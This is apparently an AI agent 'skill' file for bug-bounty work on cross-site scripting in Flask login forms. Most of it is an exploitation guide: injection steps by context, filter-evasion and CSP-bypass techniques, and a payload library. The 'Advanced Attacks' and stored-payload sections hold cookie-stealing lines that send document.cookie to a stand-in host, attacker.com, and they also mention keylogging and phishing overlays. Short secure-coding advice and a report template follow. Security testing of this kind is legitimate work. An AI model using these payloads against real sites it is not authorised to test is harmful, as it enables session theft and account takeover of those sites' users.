# 💉 Flask Login Form – Cross-Site Scripting (XSS) – AI Bug Bounty Skill

## Skill Name
`flask-xss-login`

## Description
Comprehensive detection and exploitation of Cross-Site Scripting vulnerabilities in Python Flask login forms. This skill analyses how user-supplied data in login workflows (username, password, error parameters, redirect URLs, email, etc.) is reflected, stored, or executed in the browser without proper sanitisation or encoding. It covers reflected XSS via error messages, DOM-based XSS from client-side handling of redirect parameters, stored XSS in user profiles that affect login flows, and mutation XSS (mXSS) that bypasses filters. The skill also addresses Content Security Policy (CSP) bypasses and advanced payload crafting for modern browsers.

## Affected Components
- **Login failure pages**: Error messages like "Invalid username: {{ username }}" where `username` is rendered unsafely (either via `render_template_string`, unescaped `Markup`, or missing `|e` filter).
- **`next` / `redirect` parameters** used in login templates without sanitisation:
  ```html
  <a href="{{ request.args.next }}">Continue</a>
  ```
- **Password reset/forgotten password flows**: Reflected email address or username.
- **Login form CSRF tokens**: If CSRF token is generated from user input and reflected, may lead to injection.
- **HTML5 auto-focus and `autofocus` combined with `onfocus` events** in input fields that reflect user data (e.g., value attribute injection).
- **Stored XSS via registration fields** (username, email, full name) later displayed during login process (e.g., "Welcome back, John" after login, or in admin panels viewing recent login attempts).
- **Self-XSS combined with social engineering** through crafted login links with pre-filled malicious values.

## Detection Patterns (Static & Dynamic)
### 1. Reflected XSS in Error Messages
- **Heuristic**: User input (username/email) reflected in HTML response after failed login without HTML encoding.
- **Dynamic test**: Submit `"><script>alert(1)</script>` in username; check if script executes.
- **Code pattern**:
  ```python
  # Vulnerable
  return f"<p>User {username} not found</p>"
  # Or with Markup
  from flask import Markup
  return Markup(f"<p>User {username} not found</p>")
  ```

### 2. DOM-based XSS via `next` Parameter
- **Heuristic**: JavaScript code reads `window.location.search` and writes to `innerHTML` or `document.write` using the `next` parameter.
- **Dynamic test**: Set `next` to `javascript:alert(1)` or `"-alert(1)-"` and observe execution when user clicks a link.

### 3. Stored XSS in Registration that Manifests at Login
- User registers with `<img src=x onerror=alert(1)>` as username; after successful login, the dashboard greets "Welcome, <username>" without escaping, triggering XSS.
- **Heuristic**: Any user-controlled data stored in database and later displayed on pages related to authentication.

### 4. Input Value Injection (Attribute-based XSS)
- Login form pre-fills username after a failed attempt:
  ```html
  <input type="text" name="username" value="{{ username }}">
  ```
  If `username` is not escaped, injection like `" autofocus onfocus="alert(1)` works.
- **Heuristic**: Template uses `value="{{ username }}"` without filter.

### 5. Mutation XSS in Flask Templates
- Using `|safe` filter on user input: `{{ username|safe }}`. Even if some sanitisation is applied, mutation XSS may bypass it.
- **Dynamic test**: Provide payloads that change after parser re-evaluation (e.g., nested scripts, `data:text/html`).

## Testing Methodology (AI Agent Steps)
1. **Identify Reflection Points**
   - Submit unique string `"XSS-TEST"` in username, password, and any other form fields.
   - Check response source for this string; if found, determine context:
     - Between HTML tags? → test `<>` injection.
     - Inside attribute value? → break out with `"` or `'`, add event handlers.
     - Inside JavaScript block? → close script context.
     - Inside `href` or `src`? → try `javascript:` protocol.

2. **Context-Specific Payload Injection**
   - **HTML tag context**: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`.
   - **Attribute context**: `" onmouseover="alert(1)`, `" autofocus onfocus="alert(1)`.
   - **JavaScript context**: `';alert(1);//`, `"-alert(1)-"`.
   - **URL context**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`.

3. **Bypassing Simple Filters**
   - If `<script>` is blocked: `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`, `<body onload=alert(1)>`.
   - If `alert` is blocked: use `prompt(1)`, `confirm(1)`, or `(alert)(1)`.
   - If parentheses are filtered: use backticks `alert`1`` (ES6 template literals) or `onerror=alert` with Unicode escapes.
   - If angle brackets are HTML-encoded but reflected in attribute: use `" onfocus=alert(1) autofocus="`.
   - Use case variations: `<ScRiPt>alert(1)</sCrIpT>`.
   - Use HTML entities or mixed encoding.

4. **CSP Bypass**
   - If CSP blocks inline scripts, check if `'unsafe-inline'` is allowed, or use external scripts hosted on whitelisted domains.
   - Use script gadgets: `<script src="/path/to/jsonp?callback=alert(1)"></script>`.
   - Use AngularJS or other client-side framework sinks if present.

5. **DOM-based XSS Testing**
   - Review JavaScript code that handles `location.search`, `location.hash`, `document.referrer` and writes to DOM.
   - Inject payload into URL fragment: `#<img src=x onerror=alert(1)>`.
   - Use DevTools to trace tainted data flow.

6. **Stored XSS via Registration**
   - Create account with payload in username/email, logout, then trigger login failure or check post-login greeting.
   - Payload examples: `<img src=x onerror=alert(document.cookie)>`, or polyglot: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"+/+/onmouseover=1/+/[*/[]/+alert(1)//'>`.

7. **Advanced Attacks**
   - Steal session cookies: `document.location='http://attacker.com/?c='+document.cookie`.
   - Keylogging via `onkeypress`.
   - Phishing pop-ups via dynamic overlay creation.
   - Exploit known client-side vulnerabilities (e.g., outdated jQuery).

## Payload Library (Flask Login XSS)

### Basic Probes
- `"><script>alert(1)</script>`
- `"><img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`
- `'-alert(1)-'`
- `" onfocus="alert(1)" autofocus="`
- `" onclick="alert(1)"`

### Attribute Injection (Value Attribute)
- `" onmouseover="alert(1)`
- `" style="display:block" onmouseover="alert(1)`
- `` ` onfocus=alert(1) autofocus `` (backtick, no quotes)

### URL Parameter Injection
- `javascript:alert(1)`
- `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

### Filter Evasion
- `<img src=x oNerRor=alert(1)>` (case variation)
- `<img src=x onerror="alert(1)"` (using encoded quote: `&quot;`)
- `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>` (base64 eval)
- `<details open ontoggle=alert(1)>`
- `<select autofocus onfocus=alert(1)>`

### Stored Payloads (Persistent)
- `<img src=x onerror=alert(document.cookie)>`
- `<script>new Image().src='http://attacker.com/log?cookie='+document.cookie</script>`
- Polyglot: `"><svg/onload=alert(1)>`

## Secure Coding Recommendations
- **Always escape output**: Use Jinja2's automatic escaping (default). Do not use `|safe` on user input. If you must render HTML, use a sanitisation library like Bleach.
- **Validate input**: Usernames should be alphanumeric only, emails validated with strict regex.
- **Set HTTPOnly and Secure flags on session cookies**: `SESSION_COOKIE_HTTPONLY=True`, `SESSION_COOKIE_SECURE=True`.
- **Implement Content Security Policy (CSP)** with strict directives: `default-src 'self'; script-src 'self'`.
- **Avoid DOM injection**: Do not use `innerHTML` with unsanitised data; use `textContent`.
- **Render templates correctly**:
  ```python
  return render_template('login.html', error="Invalid username", username=escape(username))
  ```
- **Use `flask.render_template_string` cautiously**; never pass user input into it unless explicitly escaped.

## Output Format (Bug Report)
```
Title: Reflected Cross-Site Scripting in Login Form
Severity: High (CVSS 6.1-8.0 depending on stolen sessions)
Endpoint: POST /login
Vulnerable Parameter: username
Proof of Concept:
  curl -X POST https://target.com/login -d "username=<script>alert(1)</script>&password=anything"
  Browser renders alert dialog.
Remediation: Escape username output with |e filter or use Markup.escape().
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with Jinja2 template engine
- **Testing Type**: Black-box / Grey-box (supplement with source if available)
- **Dependencies**: None; AI can interpret HTML responses and identify sinks.